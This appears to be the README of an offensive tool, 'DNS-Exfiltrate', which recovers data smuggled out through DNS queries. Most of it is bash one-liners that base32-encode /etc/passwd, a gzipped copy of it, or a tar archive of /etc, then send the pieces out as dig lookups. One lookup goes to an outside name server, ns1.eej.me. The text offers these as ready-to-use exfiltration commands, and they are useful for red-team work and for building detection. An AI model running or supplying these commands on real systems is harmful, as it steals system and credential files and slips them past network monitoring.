# DNS-Exfiltrate

Parses bind query or Private Burp Collaborator logs to exfiltrate data. Note that you will get more reliable results by specifying the name server via `dig @`...

Use cases (bash):

Exfiltrate a file:
```
cat /etc/passwd | base32 -w 63 |tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
```

Exfiltrate a compressed file:

```
cat /etc/passwd | gzip - | base32 -w 63 |tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
```

Exfiltrate a compressed tar archive of a directory:

```
tar czf - /etc | base32 -w 63 |tr -d =| while read a; do dig @ns1.eej.me $a.e.ns1.eej.me; done;
```
